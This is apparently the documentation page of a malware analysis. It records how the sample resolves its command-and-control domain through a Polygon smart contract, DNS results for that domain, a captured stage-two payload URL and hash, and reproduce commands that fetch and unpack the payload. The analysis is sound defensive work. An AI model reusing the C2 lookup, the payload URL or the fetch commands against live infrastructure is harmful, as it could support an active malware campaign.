# Lookups and checks

> Documentation only — the queries and file checks behind the findings.

Network lookups fall into two groups: read-only queries against **public** infrastructure (Polygon RPC
providers, Cloudflare DNS), and one capture of the payload from the C2. Everything else is local file
analysis.

## 1. On-chain C2 resolution (`eth_call`)

The malware builds exactly this body (folded out of the char arithmetic in `btcValue.getDomain()`):

```json
{"jsonrpc":"2.0","method":"eth_call",
 "params":[{"to":"0x9c0a507300fd902787bb193d80fca5ce6e1bff9a","data":"0xce6d41de"},"latest"],"id":1}
```

Replayed with `tools/c2_recon.py` on **2026-11-21**:

```
https://polygon.drpc.org              -> 0x…0020 0000…0017 7468697369736166616c7365706f7369746976652e7374
https://polygon-bor-rpc.publicnode.com-> (same)
https://1rpc.io/matic                 -> (same)
https://api.zan.top/polygon-mainnet   -> HTTP 403 (blocked for this client)
https://rpc-mainnet.matic.quiknode.pro-> (same)
```

ABI return decodes as: offset word `0x20`, length word `0x17` = 23 bytes, ASCII
`thisisafalsepositive.st`.

* The contract is live on Polygon mainnet and returns a string.
* Its current value equals the malware's hardcoded fallback (`MOKr3()`).
* Whoever controls the contract can change it at any time, without rebuilding the jar.

## 2. DNS for the resolved domain (Cloudflare DoH)

```
A     thisisafalsepositive.st   185.178.208.191        TTL 43
NS    dean.ns.cloudflare.com / luciane.ns.cloudflare.com
AAAA  (none)
TXT   (none)
```

Short A TTL + Cloudflare nameservers + a Cloudflare anycast address: the origin is hidden behind
Cloudflare, and the operator can flip it quickly. `185.178.208.191` is not the actor's server IP.

## 3. Payload capture

The payload path is served, so the campaign is active rather than parked:

```
GET https://thisisafalsepositive.st/cdn/v2/9f4e7a2c1b8d.png
-> 200, 16,956,757 bytes, PNG 720x720 RGB
   SHA-256 fb8100225454c882831f7b53b0f7dcacc4d41cb9b3abd46255695100d88331f7
```

`tools/png_extract.py` finds the `hIds` chunk (16,539,137 bytes → zlib → ZIP, 767 entries): a portable
Python 3.12 runtime, pywin32, and `AppHost/{main.py, app.pyd}`. Analysis in
[`stage2/STAGE2.md`](stage2/STAGE2.md).

Reproduce:

```bash
python3 tools/c2_recon.py --fetch-png stage2/9f4e7a2c1b8d.png   # talks to the C2, opt-in flag
python3 tools/png_extract.py stage2/9f4e7a2c1b8d.png -o stage2/extracted/
```

## 4. Local checks on the sample

| Check | Result |
|---|---|
| `unzip -l` + entry timestamps | 35 entries; `net/java/*` and blobs stamped 02-01-2016 13:00, payload classes 11-14-2026 16:05 |
| jar signature check | no `.SF`/`.RSA`/`.DSA` — unsigned |
| `l.png` chunk walk (`tools/png_extract.py`) | IHDR/PLTE/tRNS/IDAT/IEND only, **no `hIds` chunk** → the bundled icon carries nothing |
| `assets/mnqmuqdh.cache` (17 MB) | entropy 7.997 bits/byte, no repeating-XOR key at periods ≤ 64, no duplicate 16-byte blocks (not ECB), no `PK`/class-file magic; **no class references this path by name** |
| `app.pyd` resource 3 decrypt (`tools/app_pyd_decrypt.py`) | S-box + rolling-key loop located at `0x18016da80`; blob decrypts to a 237,437-byte Nuitka `.bytecode` constants store (checksum field matches, magic `.bytecode`); module tree and capability strings recovered — see [`stage2/CRACKED.md`](stage2/CRACKED.md) |
| XOR + header check on `net/java/{a,b,c}` (`tools/doomsday_unpack.py`) | all three validate: model byte 93 (j=3, k=0, pow2=2), window `0x04000000`, decoded sizes 653,551 / 85,070 / 1,217,577 |
| `javap -c -p net/java/l.class` | confirms the range-coder field pairing (`g`=range, `h`=code) and the resource/key pairing above |

## 5. Not touched

No connection to `165.22.196.0` / `2a03:d0c0:2:d0::142c:e001` (the DoomsDay update channel), and nothing
was ever submitted to `/shard/*`.
